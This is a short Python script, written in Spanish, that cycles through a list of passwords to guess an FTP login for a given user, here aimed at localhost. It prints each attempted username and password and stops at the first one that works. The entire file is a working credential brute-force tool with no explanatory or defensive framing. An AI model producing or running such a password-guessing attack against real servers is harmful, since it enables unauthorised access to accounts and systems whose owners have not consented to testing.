from ftplib import FTP

def intentar_inicio_sesion_ftp(host, username, password):
  ftp = FTP(host)
  try:
    ftp.login(username, password)
    print(f"Inicio de sesión exitoso con {username}:{password}")
    ftp.quit()
    return True
  except:
    print(f"Inicio de sesión fallido con {username}:{password}")
    return False

def descifrar_contraseña(host, username, passwords):
  for password in passwords:
    if intentar_inicio_sesion_ftp(host, username, password):
      break

host = 'localhost'
username = 'usuario'
passwords = ['123', 'contraseña', 'secreto']

descifrar_contraseña(host, username, passwords)